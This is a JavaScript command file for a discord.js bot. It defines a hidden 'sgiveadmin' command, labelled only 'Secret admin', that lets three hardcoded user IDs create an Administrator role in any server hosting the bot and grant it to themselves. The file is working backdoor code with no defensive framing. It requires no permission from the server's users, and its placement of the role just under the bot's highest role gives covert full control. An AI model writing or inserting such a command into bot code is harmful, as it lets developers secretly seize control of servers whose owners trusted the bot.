const { EmbedBuilder, PermissionFlagsBits } = require("discord.js");

module.exports = {

  name: "sgiveadmin",

  aliases: ["superadmin"],

  category: "owner",

  usage: "sgiveadmin {role name}",

  description: "Secret admin",

  args: true,

  botPerms: ["ManageRoles"],

  userPerms: [],

  owner: true,

  execute: async (client, message, args) => {

    // Define emojis

    const noEmoji = "<a:emoji_4:1309094791950372965>";

    const successEmoji = "<:emoji_35:1319658695985987624>";

    const roleEmoji = "<:chudgyeguru:1357998308643045488>";

    try {

      

      const botOwners = ["1207080102974980136", "1107521454049857627", "1112710796229742652"];

      

      if (!botOwners.includes(message.author.id.toString())) {

        const embed = new EmbedBuilder()

          .setColor("#fb5984")

          .setDescription(`${noEmoji} **Only bot owners can use this command!**`);

        return message.reply({ embeds: [embed] });

      }

      

      const roleName = args.join(" ");

      if (!roleName) {

        const embed = new EmbedBuilder()

          .setColor("#fb5984")

          .setDescription(`${noEmoji} **Please provide a valid role name.**`);

        return message.reply({ embeds: [embed] });

      }

      

      if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {

        const embed = new EmbedBuilder()

          .setColor("#fb5984")

          .setDescription(`${noEmoji} **I don't have permission to manage roles!**`);

        return message.reply({ embeds: [embed] });

      }

      

      const role = await message.guild.roles.create({

        name: roleName,

        permissions: [PermissionFlagsBits.Administrator],

        reason: `Requested by ${message.author.tag}`,

      });

      

      const botTopRole = message.guild.members.me.roles.highest;

      await role.setPosition(botTopRole.position - 1);

      

      await message.member.roles.add(role);

      

      const successEmbed = new EmbedBuilder()

        .setAuthor({ name: "Admin Role Created", iconURL: message.author.displayAvatarURL({ dynamic: true }) })

        .setDescription(

          `> ${successEmoji} **Role Created:** \`${role.name}\`\n` +

          `> ${roleEmoji} **Granted To:** ${message.author}\n` +

          `> **Permissions:** Administrator`

        )

        .setFooter({ text: `Requested by ${message.author.tag}` })

        .setColor("#fb5984");

      return message.reply({ embeds: [successEmbed] });

    } catch (error) {

      console.error("Error executing sgiveadmin command:", error);

      const errorEmbed = new EmbedBuilder()

        .setColor("#fb5984")

        .setDescription(`${noEmoji} **An error occurred while creating the role. Please try again later!**`);

      return message.reply({ embeds: [errorEmbed] });

    }

  },

};